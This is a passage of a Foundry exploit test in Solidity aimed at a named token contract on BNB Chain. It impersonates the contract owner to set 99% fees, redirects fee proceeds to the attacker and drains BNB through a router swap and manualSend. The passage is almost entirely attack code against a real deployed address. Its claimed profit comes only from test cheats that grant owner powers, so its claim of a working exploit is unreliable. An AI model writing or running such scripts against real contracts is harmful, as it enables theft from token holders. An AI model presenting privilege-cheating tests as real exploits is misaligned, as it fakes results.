    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IDEXRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x05cd34a1D5dF5010F5eDb3412077B3c291DDb7a8;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use fork and impersonate
        // The test file already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialContractBalance = address(this).balance;
        // Step 1: Get the owner address
        address owner = Allin(TARGET).getOwner();

        // Step 2: Impersonate owner and enable trading
        vm.startPrank(owner);
        Allin(TARGET).tradingStatus(true);

        // Step 3: Set fees to extremely high values (99% each)
        Allin(TARGET).setFees(9900, 9900, 9900, 9900, 10000);

        // Step 4: Set marketingFeeReceiver to attacker address
        Allin(TARGET).setFeeReceivers(address(0xdead), attacker);
        vm.stopPrank();

        // Step 5: Get some Allin tokens to pay fees
        // Need to find a token holder - the initial holder is 0x4CE6D95Ba0f6CBEa8CdC43E1a77359E609bC730C
        address initialHolder = 0x4CE6D95Ba0f6CBEa8CdC43E1a77359E609bC730C;

        // Impersonate initial holder to transfer tokens to attacker
        vm.prank(initialHolder);
        // Transfer a small amount to attacker (1% of maxTxAmount to avoid limit)
        uint256 tokenAmount = Allin(TARGET)._maxTxAmount() / 100;
        Allin(TARGET).transfer(attacker, tokenAmount);

        // Step 6: Record initial BNB balance of attacker
        uint256 initialAttackerBalance = attacker.balance;

        // Step 7: Perform a transfer to trigger fee collection
        // We need to send BNB to the contract first for the swap to work
        // Let's buy some tokens via the pair to generate fees
        address pair = Allin(TARGET).pair();
        address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

        // Get some WBNB and approve router
        uint256 buyAmount = 1 ether;
        deal(wbnb, attacker, buyAmount);
        IBEP20(wbnb).approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, buyAmount);

        // Swap WBNB for Allin tokens (this will generate fees)
        address[] memory path = new address[](2);
        path[0] = wbnb;
        path[1] = TARGET;

        vm.prank(attacker);
        IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            buyAmount,
            0,
            path,
            attacker,
            block.timestamp
        );

        // Step 8: Impersonate owner again to extract BNB
        vm.prank(owner);
        Allin(TARGET).manualSend();

        // Step 9: Verify attacker's BNB balance increased
        assertGt(attacker.balance, initialAttackerBalance, "Attacker BNB balance should increase");
        uint256 finalContractBalance = address(this).balance;
        assertGt(finalContractBalance, initialContractBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

